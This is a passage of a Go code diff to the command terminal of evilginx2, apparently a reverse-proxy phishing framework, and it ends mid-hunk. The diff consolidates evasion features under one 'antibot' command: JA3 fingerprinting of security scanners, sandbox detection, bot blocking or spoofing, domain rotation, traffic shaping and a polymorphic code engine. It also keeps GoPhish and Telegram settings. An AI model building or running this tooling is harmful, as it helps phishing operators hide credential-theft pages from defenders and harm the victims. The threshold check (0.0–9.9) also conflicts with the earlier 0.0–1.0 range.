@@ -19,6 +19,9 @@ import (
 	"strings"
 	"time"
 
+	"github.com/kgretzky/evilginx2/core/antibot/infra"
+	"github.com/kgretzky/evilginx2/core/antibot/response"
+	"github.com/kgretzky/evilginx2/core/antibot/signals"
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
 	"github.com/kgretzky/evilginx2/parser"
@@ -167,47 +170,17 @@ func (t *Terminal) DoWork() {
 			if err != nil {
 				log.Error("whitelist: %v", err)
 			}
-		case "ja3":
+		case "antibot":
 			cmd_ok = true
-			err := t.handleJA3(args[1:])
+			err := t.handleAntibot(args[1:])
 			if err != nil {
-				log.Error("ja3: %v", err)
-			}
-		case "captcha":
-			cmd_ok = true
-			err := t.handleCaptcha(args[1:])
-			if err != nil {
-				log.Error("captcha: %v", err)
-			}
-		case "domain-rotation":
-			cmd_ok = true
-			err := t.handleDomainRotation(args[1:])
-			if err != nil {
-				log.Error("domain-rotation: %v", err)
-			}
-		case "traffic-shaping":
-			cmd_ok = true
-			err := t.handleTrafficShaping(args[1:])
-			if err != nil {
-				log.Error("traffic-shaping: %v", err)
-			}
-		case "sandbox":
-			cmd_ok = true
-			err := t.handleSandbox(args[1:])
-			if err != nil {
-				log.Error("sandbox: %v", err)
+				log.Error("antibot: %v", err)
 			}
 		case "c2":
 			cmd_ok = true
 			err := t.handleC2(args[1:])
 			if err != nil {
 				log.Error("c2: %v", err)
-			}
-		case "polymorphic":
-			cmd_ok = true
-			err := t.handlePolymorphic(args[1:])
-			if err != nil {
-				log.Error("polymorphic: %v", err)
 			}
 		case "test-certs":
 			cmd_ok = true
@@ -260,53 +233,12 @@ func (t *Terminal) handleConfig(args []string) error {
 
 		lureStrategy := t.cfg.GetLureGenerationStrategy()
 
-		antibotEnabled := "false"
-		if t.cfg.GetAntibotConfig().Enabled {
-			antibotEnabled = "true"
-		}
-		antibotAction := t.cfg.GetAntibotConfig().Action
-		antibotThreshold := fmt.Sprintf("%.2f", t.cfg.GetAntibotConfig().MLThreshold)
-		antibotOverrideIPs := strconv.Itoa(len(t.cfg.GetAntibotConfig().OverrideIPs))
-
-		jsObfEnabled := "false"
-		if t.cfg.GetJSObfuscationConfig().Enabled {
-			jsObfEnabled = "true"
-		}
-		jsObfLevel := t.cfg.GetJSObfuscationConfig().Level
-		if jsObfLevel == "" {
-			jsObfLevel = "medium"
-		}
-
-		mlEnabled := "false"
-		if t.cfg.GetMLDetectorConfig().Enabled {
-			mlEnabled = "true"
-		}
-		mlThreshold := fmt.Sprintf("%.2f", t.cfg.GetMLDetectorConfig().Threshold)
-		mlCollect := "false"
-		if t.cfg.GetMLDetectorConfig().CollectBehavior {
-			mlCollect = "true"
-		}
-		mlLogPred := "false"
-		if t.cfg.GetMLDetectorConfig().LogPredictions {
-			mlLogPred = "true"
-		}
-
-		dnsProvider := t.cfg.GetDNSProviderConfig().Provider
-		dnsEnabled := "false"
-		if t.cfg.GetDNSProviderConfig().Enabled {
-			dnsEnabled = "true"
-		}
-		dnsWildcard := "false"
-		if t.cfg.GetDNSProviderConfig().WildcardEnabled {
-			dnsWildcard = "true"
-		}
-
 		redirectorsDir := t.cfg.GetRedirectorsDir()
 
-		keys := []string{"domain", "primary_domain", "domains_count", "external_ipv4", "bind_ipv4", "http_port", "https_port", "dns_port", "unauth_url", "autocert", "redirectors_dir", "lure_strategy", "antibot enabled", "antibot action", "antibot threshold", "antibot override_ips", "js_obfuscation enabled", "js_obfuscation level", "ml_detector enabled", "ml_detector threshold", "ml_detector collect_behavior", "ml_detector log_predictions", "dns_provider provider", "dns_provider enabled", "dns_provider wildcard", "gophish admin_url", "gophish api_key", "gophish insecure", "telegram bot_token", "telegram chat_id", "telegram enabled", "cloudflare_worker account_id", "cloudflare_worker api_token", "cloudflare_worker zone_id", "cloudflare_worker subdomain", "cloudflare_worker enabled"}
+		keys := []string{"domain", "primary_domain", "domains_count", "external_ipv4", "bind_ipv4", "http_port", "https_port", "dns_port", "unauth_url", "autocert", "redirectors_dir", "lure_strategy", "gophish admin_url", "gophish api_key", "gophish insecure", "telegram bot_token", "telegram chat_id", "telegram enabled", "cloudflare_worker account_id", "cloudflare_worker api_token", "cloudflare_worker zone_id", "cloudflare_worker subdomain", "cloudflare_worker enabled"}
 		primaryDomain := t.cfg.GetPrimaryDomain()
 		domainsCount := strconv.Itoa(len(t.cfg.GetDomains()))
-		vals := []string{t.cfg.general.Domain, primaryDomain, domainsCount, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpPort), strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, redirectorsDir, lureStrategy, antibotEnabled, antibotAction, antibotThreshold, antibotOverrideIPs, jsObfEnabled, jsObfLevel, mlEnabled, mlThreshold, mlCollect, mlLogPred, dnsProvider, dnsEnabled, dnsWildcard, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatID(), telegramEnabled, t.cfg.cloudflareWorkerConfig.AccountID, t.cfg.cloudflareWorkerConfig.APIToken, t.cfg.cloudflareWorkerConfig.ZoneID, t.cfg.cloudflareWorkerConfig.WorkerSubdomain, cfWorkerEnabled}
+		vals := []string{t.cfg.general.Domain, primaryDomain, domainsCount, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpPort), strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, redirectorsDir, lureStrategy, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.GetTelegramBotToken(), t.cfg.GetTelegramChatID(), telegramEnabled, t.cfg.cloudflareWorkerConfig.AccountID, t.cfg.cloudflareWorkerConfig.APIToken, t.cfg.cloudflareWorkerConfig.ZoneID, t.cfg.cloudflareWorkerConfig.WorkerSubdomain, cfWorkerEnabled}
 		log.Printf("\n%s\n", AsRows(keys, vals))
 		return nil
 	} else if pn == 2 {
@@ -467,68 +399,10 @@ func (t *Terminal) handleConfig(args []string) error {
 				t.manageCertificates(false)
 				return nil
 			}
-		case "antibot":
-			switch args[1] {
-			case "override_ips":
-				switch args[2] {
-				case "add":
-					err := t.cfg.AddAntibotOverrideIP(args[3])
-					if err != nil {
-						return err
-					}
-					return nil
-				case "remove":
-					err := t.cfg.RemoveAntibotOverrideIP(args[3])
-					if err != nil {
-						return err
-					}
-					return nil
-				}
-			}
 		}
 	} else if pn == 3 {
 		switch args[0] {
-		case "antibot":
-			switch args[1] {
-			case "enabled":
-				switch args[2] {
-				case "true":
-					t.cfg.SetAntibotEnabled(true)
-					return nil
-				case "false":
-					t.cfg.SetAntibotEnabled(false)
-					return nil
-				}
-			case "action":
-				if args[2] == "block" || args[2] == "spoof" {
-					t.cfg.SetAntibotAction(args[2])
-					return nil
-				}
-				return fmt.Errorf("invalid action: %s (must be 'block' or 'spoof')", args[2])
-			case "spoof_url":
-				t.cfg.SetAntibotSpoofUrl(args[2])
-				return nil
-			case "threshold":
-				threshold, err := strconv.ParseFloat(args[2], 64)
-				if err != nil {
-					return fmt.Errorf("invalid threshold: %s", args[2])
-				}
-				t.cfg.SetAntibotThreshold(threshold)
-				return nil
-			case "override_ips":
-				if args[2] == "list" {
-					ips := t.cfg.GetAntibotConfig().OverrideIPs
-					if len(ips) == 0 {
-						log.Info("antibot override IPs: empty")
-					} else {
-						log.Info("antibot override IPs:")
-						for _, ip := range ips {
-							log.Info("  - %s", ip)
-						}
-					}
-					return nil
-				}
-			}
+
 		case "domains":
 			switch args[1] {
 			case "add":
@@ -658,117 +532,10 @@ func (t *Terminal) handleConfig(args []string) error {
 				}
 				return nil
 			}
-		case "js_obfuscation":
-			switch args[1] {
-			case "enabled":
-				cfg := t.cfg.GetJSObfuscationConfig()
-				level := cfg.Level
-				if level == "" {
-					level = "medium"
-				}
-				switch args[2] {
-				case "true":
-					t.cfg.SetJSObfuscation(true, level)
-					return nil
-				case "false":
-					t.cfg.SetJSObfuscation(false, level)
-					return nil
-				}
-			case "level":
-				validLevels := []string{"low", "medium", "high"}
-				isValid := false
-				for _, l := range validLevels {
-					if l == args[2] {
-						isValid = true
-						break
-					}
-				}
-				if !isValid {
-					return fmt.Errorf("invalid level: %s (valid: low, medium, high)", args[2])
-				}
-				cfg := t.cfg.GetJSObfuscationConfig()
-				t.cfg.SetJSObfuscation(cfg.Enabled, args[2])
-				return nil
-			}
-		case "ml_detector":
-			switch args[1] {
-			case "enabled":
-				cfg := t.cfg.GetMLDetectorConfig()
-				switch args[2] {
-				case "true":
-					t.cfg.SetMLDetector(true, cfg.Threshold, cfg.CollectBehavior, cfg.LogPredictions)
-					return nil
-				case "false":
-					t.cfg.SetMLDetector(false, cfg.Threshold, cfg.CollectBehavior, cfg.LogPredictions)
-					return nil
-				}
-			case "threshold":
-				threshold, err := strconv.ParseFloat(args[2], 64)
-				if err != nil {
-					return fmt.Errorf("invalid threshold: %s", args[2])
-				}
-				cfg := t.cfg.GetMLDetectorConfig()
-				t.cfg.SetMLDetector(cfg.Enabled, threshold, cfg.CollectBehavior, cfg.LogPredictions)
-				return nil
-			case "collect_behavior":
-				cfg := t.cfg.GetMLDetectorConfig()
-				switch args[2] {
-				case "true":
-					t.cfg.SetMLDetector(cfg.Enabled, cfg.Threshold, true, cfg.LogPredictions)
-					return nil
-				case "false":
-					t.cfg.SetMLDetector(cfg.Enabled, cfg.Threshold, false, cfg.LogPredictions)
-					return nil
-				}
-			case "log_predictions":
-				cfg := t.cfg.GetMLDetectorConfig()
-				switch args[2] {
-				case "true":
-					t.cfg.SetMLDetector(cfg.Enabled, cfg.Threshold, cfg.CollectBehavior, true)
-					return nil
-				case "false":
-					t.cfg.SetMLDetector(cfg.Enabled, cfg.Threshold, cfg.CollectBehavior, false)
-					return nil
-				}
-			}
-		case "dns_provider":
-			switch args[1] {
-			case "provider":
-				cfg := t.cfg.GetDNSProviderConfig()
-				t.cfg.SetDNSProvider(args[2], cfg.ApiKey, cfg.Email, cfg.Enabled, cfg.WildcardEnabled)
-				return nil
-			case "api_key":
-				cfg := t.cfg.GetDNSProviderConfig()
-				t.cfg.SetDNSProvider(cfg.Provider, args[2], cfg.Email, cfg.Enabled, cfg.WildcardEnabled)
-				return nil
-			case "email":
-				cfg := t.cfg.GetDNSProviderConfig()
-				t.cfg.SetDNSProvider(cfg.Provider, cfg.ApiKey, args[2], cfg.Enabled, cfg.WildcardEnabled)
-				return nil
-			case "enabled":
-				cfg := t.cfg.GetDNSProviderConfig()
-				switch args[2] {
-				case "true":
-					t.cfg.SetDNSProvider(cfg.Provider, cfg.ApiKey, cfg.Email, true, cfg.WildcardEnabled)
-					return nil
-				case "false":
-					t.cfg.SetDNSProvider(cfg.Provider, cfg.ApiKey, cfg.Email, false, cfg.WildcardEnabled)
-					return nil
-				}
-			case "wildcard":
-				cfg := t.cfg.GetDNSProviderConfig()
-				switch args[2] {
-				case "true":
-					t.cfg.SetDNSProvider(cfg.Provider, cfg.ApiKey, cfg.Email, cfg.Enabled, true)
-					return nil
-				case "false":
-					t.cfg.SetDNSProvider(cfg.Provider, cfg.ApiKey, cfg.Email, cfg.Enabled, false)
-					return nil
-				}
-			}
+
 		}
 	}
-	return fmt.Errorf("invalid syntax: %s", args)
+	return fmt.Errorf("invalid syntax: %v", args)
 }
 
 func (t *Terminal) handleBlacklist(args []string) error {
@@ -899,8 +666,8 @@ func (t *Terminal) handleJA3(args []string) error {
 
 	// No arguments - show basic stats
 	if pn == 0 {
-		if t.p.ja3Fingerprinter != nil {
-			stats := t.p.ja3Fingerprinter.GetJA3Stats()
+		if t.p.antibotEngine != nil && t.p.antibotEngine.TLS != nil && t.p.antibotEngine.TLS.Fingerprinter != nil {
+			stats := t.p.antibotEngine.TLS.Fingerprinter.GetJA3Stats()
 			log.Info("JA3/JA3S TLS Fingerprinting Statistics:")
 			log.Info("  Total fingerprints captured: %d", stats["total_fingerprints"])
 			log.Info("  Known bot signatures: %d", stats["known_bots"])
@@ -918,8 +685,8 @@ func (t *Terminal) handleJA3(args []string) error {
 	// Handle subcommands
 	switch args[0] {
 	case "stats":
-		if t.p.ja3Fingerprinter != nil {
-			stats := t.p.ja3Fingerprinter.GetJA3Stats()
+		if t.p.antibotEngine != nil && t.p.antibotEngine.TLS != nil && t.p.antibotEngine.TLS.Fingerprinter != nil {
+			stats := t.p.antibotEngine.TLS.Fingerprinter.GetJA3Stats()
 			log.Info("=== JA3/JA3S TLS Fingerprinting Statistics ===")
 			log.Info("")
 			log.Info("Capture Statistics:")
@@ -939,8 +706,8 @@ func (t *Terminal) handleJA3(args []string) error {
 		return nil
 
 	case "signatures":
-		if t.p.ja3Fingerprinter != nil {
-			signatures := t.p.ja3Fingerprinter.ExportSignatures()
+		if t.p.antibotEngine != nil && t.p.antibotEngine.TLS != nil && t.p.antibotEngine.TLS.Fingerprinter != nil {
+			signatures := t.p.antibotEngine.TLS.Fingerprinter.ExportSignatures()
 			log.Info("=== Known Bot JA3 Signatures ===")
 			log.Info("")
 			log.Info("%-30s %-35s %-15s %s", "Bot Name", "JA3 Hash", "Confidence", "Description")
@@ -968,15 +735,15 @@ func (t *Terminal) handleJA3(args []string) error {
 			return fmt.Errorf("invalid JA3 hash length (must be 32 characters MD5 hash)")
 		}
 
-		if t.p.ja3Fingerprinter != nil {
-			t.p.ja3Fingerprinter.AddCustomSignature(name, ja3Hash, description)
+		if t.p.antibotEngine != nil && t.p.antibotEngine.TLS != nil && t.p.antibotEngine.TLS.Fingerprinter != nil {
+			t.p.antibotEngine.TLS.Fingerprinter.AddCustomSignature(name, ja3Hash, description)
 			log.Success("Added custom JA3 signature for: %s", name)
 		}
 		return nil
 
 	case "export":
-		if t.p.ja3Fingerprinter != nil {
-			signatures := t.p.ja3Fingerprinter.ExportSignatures()
+		if t.p.antibotEngine != nil && t.p.antibotEngine.TLS != nil && t.p.antibotEngine.TLS.Fingerprinter != nil {
+			signatures := t.p.antibotEngine.TLS.Fingerprinter.ExportSignatures()
 
 			// Convert to JSON
 			output, err := json.MarshalIndent(signatures, "", "  ")
@@ -1076,7 +843,7 @@ func (t *Terminal) handleCaptcha(args []string) error {
 
 		// Reinitialize CAPTCHA manager with new config
 		if t.p.captchaManager != nil {
-			t.p.captchaManager = NewCaptchaManager(t.cfg.GetCaptchaConfig())
+			t.p.captchaManager = response.NewCaptchaManager(t.cfg.GetCaptchaConfig())
 		}
 
 		log.Success("CAPTCHA provider %s configured successfully", provider)
@@ -1155,7 +922,7 @@ func (t *Terminal) handleDomainRotation(args []string) error {
 			t.cfg.SetDomainRotationEnabled(true)
 			// Initialize if not already done
 			if t.p.domainRotation == nil {
-				t.p.domainRotation = NewDomainRotationManager(t.cfg.GetDomainRotationConfig(), t.p.crt_db)
+				t.p.domainRotation = infra.NewDomainRotationManager(t.cfg.GetDomainRotationConfig())
 			}
 			t.p.domainRotation.Start()
 			log.Success("Domain rotation enabled")
@@ -1364,8 +1131,8 @@ func (t *Terminal) handleTrafficShaping(args []string) error {
 
 	// No arguments - show current configuration
 	if pn == 0 {
-		if t.p.trafficShaper != nil {
-			stats := t.p.trafficShaper.GetStats()
+		if t.p.antibotEngine != nil && t.p.antibotEngine.Rate != nil {
+			stats := t.p.antibotEngine.Rate.GetStats()
 			log.Info("Traffic Shaping Configuration:")
 			log.Info("  Enabled: %v", stats["enabled"])
 			log.Info("  Mode: %s", stats["mode"])
@@ -1393,15 +1160,17 @@ func (t *Terminal) handleTrafficShaping(args []string) error {
 		case "on":
 			t.cfg.SetTrafficShapingEnabled(true)
 			// Initialize if not already done
-			if t.p.trafficShaper == nil {
-				t.p.trafficShaper = NewTrafficShaper(t.cfg.GetTrafficShapingConfig())
+			if t.p.antibotEngine != nil && t.p.antibotEngine.Rate == nil {
+				t.p.antibotEngine.Rate = signals.NewTrafficShaper(t.cfg.GetTrafficShapingConfig())
 			}
-			t.p.trafficShaper.Start()
+			if t.p.antibotEngine != nil && t.p.antibotEngine.Rate != nil {
+				t.p.antibotEngine.Rate.Start()
+			}
 			log.Success("Traffic shaping enabled")
 		case "off":
 			t.cfg.SetTrafficShapingEnabled(false)
-			if t.p.trafficShaper != nil {
-				t.p.trafficShaper.Stop()
+			if t.p.antibotEngine != nil && t.p.antibotEngine.Rate != nil {
+				t.p.antibotEngine.Rate.Stop()
 			}
 			log.Success("Traffic shaping disabled")
 		default:
@@ -1492,11 +1261,11 @@ func (t *Terminal) handleTrafficShaping(args []string) error {
 		return nil
 
 	case "stats":
-		if t.p.trafficShaper == nil {
+		if t.p.antibotEngine == nil || t.p.antibotEngine.Rate == nil {
 			return fmt.Errorf("traffic shaping not initialized")
 		}
 
-		stats := t.p.trafficShaper.GetStats()
+		stats := t.p.antibotEngine.Rate.GetStats()
 		log.Info("=== Traffic Shaping Statistics ===")
 		log.Info("")
 		log.Info("Configuration:")
@@ -1546,8 +1315,8 @@ func (t *Terminal) handleSandbox(args []string) error {
 			log.Info("  Server-side Checks: %v", config.ServerSideChecks)
 			log.Info("  Client-side Checks: %v", config.ClientSideChecks)
 
-			if t.p.sandboxDetector != nil {
-				stats := t.p.sandboxDetector.GetStats()
+			if t.p.antibotEngine != nil && t.p.antibotEngine.Telemetry != nil {
+				stats := t.p.antibotEngine.Telemetry.GetStats()
 				log.Info("")
 				log.Info("Statistics:")
 				log.Info("  Total Checks: %d", stats["total_checks"])
@@ -1575,8 +1344,12 @@ func (t *Terminal) handleSandbox(args []string) error {
 		case "on":
 			t.cfg.SetSandboxDetectionEnabled(true)
 			// Initialize if not already done
-			if t.p.sandboxDetector == nil {
-				t.p.sandboxDetector = NewSandboxDetector(t.cfg.GetSandboxDetectionConfig(), t.p.obfuscator)
+			if t.p.antibotEngine != nil && t.p.antibotEngine.Telemetry == nil {
+				mlThreshold := float64(0.8)
+				if t.cfg.IsMLDetectorEnabled() {
+					mlThreshold = t.cfg.GetMLDetectorConfig().Threshold
+				}
+				t.p.antibotEngine.Telemetry = signals.NewTelemetrySignal(mlThreshold, t.p.antibotEngine.TLS.Interceptor, true)
 			}
 			log.Success("Sandbox detection enabled")
 		case "off":
@@ -1647,11 +1420,19 @@ func (t *Terminal) handleSandbox(args []string) error {
 		return nil
 
 	case "stats":
-		if t.p.sandboxDetector == nil {
-			return fmt.Errorf("sandbox detection not initialized")
+		if t.p.antibotEngine == nil || t.p.antibotEngine.Telemetry == nil {
+			if t.p.antibotEngine != nil {
+				mlThreshold := float64(0.8)
+				if t.cfg.IsMLDetectorEnabled() {
+					mlThreshold = t.cfg.GetMLDetectorConfig().Threshold
+				}
+				t.p.antibotEngine.Telemetry = signals.NewTelemetrySignal(mlThreshold, t.p.antibotEngine.TLS.Interceptor, true)
+			} else {
+				return fmt.Errorf("telemetry detection not initialized")
+			}
 		}
 
-		stats := t.p.sandboxDetector.GetStats()
+		stats := t.p.antibotEngine.Telemetry.GetStats()
 		log.Info("=== Sandbox Detection Statistics ===")
 		log.Info("")
 		log.Info("Detection Summary:")
@@ -1949,7 +1730,7 @@ func (t *Terminal) handlePolymorphic(args []string) error {
 			t.cfg.SetPolymorphicEnabled(true)
 			// Initialize if not already done
 			if t.p.polymorphicEngine == nil {
-				t.p.polymorphicEngine = NewPolymorphicEngine(t.cfg.GetPolymorphicConfig())
+				t.p.polymorphicEngine = infra.NewPolymorphicEngine(t.cfg.GetPolymorphicConfig())
 			}
 			log.Success("Polymorphic engine enabled")
 		case "off":
@@ -1985,7 +1766,7 @@ func (t *Terminal) handlePolymorphic(args []string) error {
 			log.Success("Polymorphic cache disabled")
 		case "clear":
 			if t.p.polymorphicEngine != nil {
-				t.p.polymorphicEngine.clearCache()
+				t.p.polymorphicEngine.ClearCache()
 				log.Success("Polymorphic cache cleared")
 			} else {
 				return fmt.Errorf("polymorphic engine not initialized")
@@ -2074,7 +1855,7 @@ func (t *Terminal) handlePolymorphic(args []string) error {
 		log.Info("")
 
 		// Generate mutations
-		context := &MutationContext{
+		context := &infra.MutationContext{
 			SessionID: "test-session",
 			Timestamp: time.Now().Unix(),
 		}
@@ -2119,6 +1900,83 @@ func (t *Terminal) handlePolymorphic(args []string) error {
 
 	default:
 		return fmt.Errorf("unknown subcommand: %s", args[0])
+	}
+}
+
+func (t *Terminal) handleAntibot(args []string) error {
+	pn := len(args)
+	if pn == 0 {
+		return fmt.Errorf("use 'antibot <subcommand>' (e.g., sandbox, traffic-shaping, polymorphic, ja3)")
+	}
+
+	switch args[0] {
+	case "sandbox":
+		return t.handleSandbox(args[1:])
+	case "traffic-shaping":
+		return t.handleTrafficShaping(args[1:])
+	case "polymorphic":
+		return t.handlePolymorphic(args[1:])
+	case "ja3":
+		return t.handleJA3(args[1:])
+	default:
+		// Attempt to parse global antibot config (e.g. antibot enabled, antibot action)
+		if pn == 1 {
+			return fmt.Errorf("invalid antibot command or syntax: %s", args[0])
+		}
+		
+		switch args[0] {
+		case "enabled":
+			switch args[1] {
+			case "true":
+				t.cfg.SetAntibotEnabled(true)
+				return nil
+			case "false":
+				t.cfg.SetAntibotEnabled(false)
+				return nil
+			}
+		case "action":
+			t.cfg.SetAntibotAction(args[1])
+			return nil
+		case "spoof_url":
+			t.cfg.SetAntibotSpoofUrl(args[1])
+			return nil
+		case "threshold":
+			threshold, err := strconv.ParseFloat(args[1], 64)
+			if err != nil {
+				return fmt.Errorf("invalid threshold: %s", args[1])
+			}
+			if threshold < 0.0 || threshold > 9.9 {
+				return fmt.Errorf("threshold must be between 0.0 and 9.9")
+			}
+			t.cfg.SetAntibotThreshold(threshold)
+			return nil
+		case "override_ips":
+			if args[1] == "list" {
+				ips := t.cfg.GetAntibotConfig().OverrideIPs
+				if len(ips) == 0 {
+					log.Info("antibot override IPs: empty")
+				} else {
+					log.Info("antibot override IPs:")
+					for _, ip := range ips {
+						log.Info("  - %s", ip)
+					}
+				}
+				return nil
+			}
+			if pn < 3 {
+				return fmt.Errorf("syntax: antibot override_ips <add|remove> <ip>")
+			}
+			if args[1] == "add" {
+				t.cfg.AddAntibotOverrideIP(args[2])
+				log.Success("Added IP to antibot override list: %s", args[2])
+				return nil
+			} else if args[1] == "remove" {
+				t.cfg.RemoveAntibotOverrideIP(args[2])
+				log.Success("Removed IP from antibot override list: %s", args[2])
+				return nil
+			}
+		}
+		return fmt.Errorf("unknown antibot block subcommand: %s", args[0])
 	}
 }
 
@@ -3455,13 +3313,9 @@ func (t *Terminal) createHelp() {
 		readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ipv4", readline.PcItem("external"), readline.PcItem("bind")), readline.PcItem("unauth_url"), readline.PcItem("autocert", readline.PcItem("on"), readline.PcItem("off")),
 			readline.PcItem("lure_strategy", readline.PcItem("short"), readline.PcItem("medium"), readline.PcItem("long"), readline.PcItem("realistic"), readline.PcItem("hex"), readline.PcItem("base64"), readline.PcItem("mixed")),
 			readline.PcItem("domains", readline.PcItem("list"), readline.PcItem("add"), readline.PcItem("remove"), readline.PcItem("set-primary"), readline.PcItem("enable"), readline.PcItem("disable")),
-			readline.PcItem("antibot", readline.PcItem("enabled", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("action", readline.PcItem("block"), readline.PcItem("spoof")), readline.PcItem("spoof_url"), readline.PcItem("threshold"), readline.PcItem("override_ips", readline.PcItem("list"), readline.PcItem("add"), readline.PcItem("remove"))),
 			readline.PcItem("gophish", readline.PcItem("admin_url"), readline.PcItem("api_key"), readline.PcItem("insecure", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test")),
 			readline.PcItem("telegram", readline.PcItem("bot_token"), readline.PcItem("chat_id"), readline.PcItem("enabled", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test")),
 			readline.PcItem("cloudflare_worker", readline.PcItem("account_id"), readline.PcItem("api_token"), readline.PcItem("zone_id"), readline.PcItem("subdomain"), readline.PcItem("enabled", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test")),
-			readline.PcItem("js_obfuscation", readline.PcItem("enabled", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("level", readline.PcItem("low"), readline.PcItem("medium"), readline.PcItem("high"))),
-			readline.PcItem("ml_detector", readline.PcItem("enabled", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("threshold"), readline.PcItem("collect_behavior", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("log_predictions", readline.PcItem("true"), readline.PcItem("false"))),
-			readline.PcItem("dns_provider", readline.PcItem("provider"), readline.PcItem("api_key"), readline.PcItem("email"), readline.PcItem("enabled", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("wildcard", readline.PcItem("true"), readline.PcItem("false"))),
 			readline.PcItem("http_port"), readline.PcItem("https_port"), readline.PcItem("dns_port"),
 			readline.PcItem("redirectors_dir")))
 	h.AddSubCommand("config", nil, "", "show all configuration variables")
@@ -3492,22 +3346,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("config", []string{"domains", "set-primary"}, "domains set-primary <domain>", "set which domain is the primary domain")
 	h.AddSubCommand("config", []string{"domains", "enable"}, "domains enable <domain>", "enable a domain for use")
 	h.AddSubCommand("config", []string{"domains", "disable"}, "domains disable <domain>", "disable a domain (keeps it in pool but inactive)")
-	h.AddSubCommand("config", []string{"antibot", "enabled"}, "antibot enabled <true|false>", "enable or disable antibot detection")
-	h.AddSubCommand("config", []string{"antibot", "action"}, "antibot action <block|spoof>", "set action when bot is detected")
-	h.AddSubCommand("config", []string{"antibot", "spoof_url"}, "antibot spoof_url <url>", "set URL to redirect detected bots to when action is 'spoof'")
-	h.AddSubCommand("config", []string{"antibot", "threshold"}, "antibot threshold <0.0-1.0>", "set ML detection confidence threshold")
-	h.AddSubCommand("config", []string{"antibot", "override_ips"}, "antibot override_ips <list|add|remove>", "manage IPs that bypass antibot detection")
-	h.AddSubCommand("config", []string{"js_obfuscation", "enabled"}, "js_obfuscation enabled <true|false>", "enable or disable JavaScript obfuscation")
-	h.AddSubCommand("config", []string{"js_obfuscation", "level"}, "js_obfuscation level <low|medium|high>", "set JavaScript obfuscation level")
-	h.AddSubCommand("config", []string{"ml_detector", "enabled"}, "ml_detector enabled <true|false>", "enable or disable ML bot detection")
-	h.AddSubCommand("config", []string{"ml_detector", "threshold"}, "ml_detector threshold <0.0-1.0>", "set ML bot detection confidence threshold")
-	h.AddSubCommand("config", []string{"ml_detector", "collect_behavior"}, "ml_detector collect_behavior <true|false>", "enable or disable bot behavior collection for training")
-	h.AddSubCommand("config", []string{"ml_detector", "log_predictions"}, "ml_detector log_predictions <true|false>", "enable or disable logging of ML bot predictions")
-	h.AddSubCommand("config", []string{"dns_provider", "provider"}, "dns_provider provider <name>", "set active DNS provider (e.g. cloudflare, route53)")
-	h.AddSubCommand("config", []string{"dns_provider", "api_key"}, "dns_provider api_key <key>", "set DNS provider API key")
-	h.AddSubCommand("config", []string{"dns_provider", "email"}, "dns_provider email <email>", "set DNS provider account email")
-	h.AddSubCommand("config", []string{"dns_provider", "enabled"}, "dns_provider enabled <true|false>", "enable or disable DNS provider")
-	h.AddSubCommand("config", []string{"dns_provider", "wildcard"}, "dns_provider wildcard <true|false>", "enable or disable wildcard DNS records")
+
 	h.AddSubCommand("config", []string{"http_port"}, "http_port <port>", "set HTTP proxy port")
 	h.AddSubCommand("config", []string{"https_port"}, "https_port <port>", "set HTTPS proxy port")
 	h.AddSubCommand("config", []string{"dns_port"}, "dns_port <port>", "set DNS server port")
@@ -3618,140 +3457,35 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("whitelist", []string{"clear"}, "clear", "remove all IP addresses from the whitelist")
 	h.AddSubCommand("whitelist", []string{"log"}, "log <on|off>", "enable or disable log output for whitelist messages")
 
-	h.AddCommand("ja3", "general", "manage JA3/JA3S TLS fingerprinting", "Shows JA3 fingerprinting statistics and manage custom bot signatures.", LAYER_TOP,
-		readline.PcItem("ja3", readline.PcItem("stats"), readline.PcItem("signatures"), readline.PcItem("add"), readline.PcItem("export")))
+	h.AddCommand("antibot", "general", "manage all antibot features", "Configure all antibot functionalities, including JA3, CAPTCHA, Sandbox, and Polymorphic engines.", LAYER_TOP,
+		readline.PcItem("antibot",
+			readline.PcItem("enabled", readline.PcItem("true"), readline.PcItem("false")), 
+			readline.PcItem("action", readline.PcItem("block"), readline.PcItem("spoof")), 
+			readline.PcItem("spoof_url"), 
+			readline.PcItem("threshold"), 
+			readline.PcItem("override_ips", readline.PcItem("list"), readline.PcItem("add"), readline.PcItem("remove")),
+			readline.PcItem("ja3"),
+			readline.PcItem("captcha"),
+			readline.PcItem("domain-rotation"),
+			readline.PcItem("traffic-shaping"),
+			readline.PcItem("sandbox"),
+			readline.PcItem("polymorphic")))
 
-	h.AddSubCommand("ja3", nil, "", "show JA3 fingerprinting statistics")
-	h.AddSubCommand("ja3", []string{"stats"}, "stats", "show detailed JA3 fingerprinting statistics")
-	h.AddSubCommand("ja3", []string{"signatures"}, "signatures", "list all known bot JA3 signatures")
-	h.AddSubCommand("ja3", []string{"add"}, "add <name> <ja3_hash> <description>", "add custom bot JA3 signature")
-	h.AddSubCommand("ja3", []string{"export"}, "export", "export bot JA3 signatures to JSON")
-
-	h.AddCommand("captcha", "general", "manage CAPTCHA protection", "Configure and manage multiple CAPTCHA providers for bot protection.", LAYER_TOP,
-		readline.PcItem("captcha",
-			readline.PcItem("enable", readline.PcItem("on"), readline.PcItem("off")),
